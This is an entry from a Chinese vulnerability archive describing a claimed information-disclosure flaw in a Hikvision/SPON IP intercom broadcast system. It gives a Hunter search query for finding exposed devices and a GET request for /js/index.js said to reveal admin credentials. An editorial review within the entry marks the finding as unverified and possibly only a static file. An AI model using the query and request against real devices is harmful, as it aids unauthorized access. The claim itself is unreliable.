---
source: "wy876 漏洞文库"
id: "vw-8a5f2e7c859252bd1c130682"
entity_id: "ve-8a5f2e7c859252bd1c130682"
schema_version: "1"
title: "海康威视SPON IP网络对讲广播系统index存在信息泄露漏洞"
product: "标称Hikvision SPON IP广播系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "静态JS可读，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86SPONIP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9Findex%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ladsou0vl281yvr7"
source_status: "recorded"
---

# 海康威视SPON IP网络对讲广播系统index存在信息泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：标称Hikvision SPON IP广播系统
- 本文讨论：index.js声明硬编码/泄露账号密码
- 版本、权限与配置前提：静态JS可读，版本未知
- 资料类型：静态JS信息线索；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅GET index.js无脚本内容，正常前端资源可见不证明凭据泄露
- 应展示具体变量/密钥用途与权限，不应误把静态资源访问作漏洞
- 品牌关联不确定
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- JS是否含实际账号、认证意义和版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统index存在信息泄露漏洞，攻击者可通过该漏洞在服务器端读取账户密码，从而登录后台。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征


# 四、漏洞复现
```http
GET /js/index.js?t=0.1 HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate, br
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ladsou0vl281yvr7>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
